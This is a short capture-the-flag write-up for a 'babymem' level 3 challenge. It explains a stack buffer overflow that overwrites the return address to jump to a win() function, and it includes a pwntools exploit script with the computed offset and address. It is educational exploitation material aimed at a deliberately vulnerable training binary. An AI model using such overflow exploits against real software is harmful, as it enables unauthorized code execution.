## Level 3

Our goal is to control PC register and execute `win()` function. So we need to figure out:

1. how many bytes should we overwrite (buffer size + old rbp)
2. the address of win()

Use radare2 to disassemble the ELF executable. According to the amd64 syscall table, we know that the buffer size (rsi) is 0x30 = 48. So we need to cover 48 + 8 (old rbp) + 8 (return address) = 64 bytes in total. Besides, the address of win() is 0x401d9e. 

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-3.PNG?raw=true)

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-2.PNG?raw=true)

So the payload is

```python
import pwn 
proc = pwn.process("/babymem_level3_testing2")
proc.sendline("64")
ret_addr = pwn.p64(0x401d9e, endian='little')
payload = b"a" * 56 + ret_addr
proc.sendline(payload)
proc.read(4096)
```

![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L3-test2-1.PNG?raw=true)



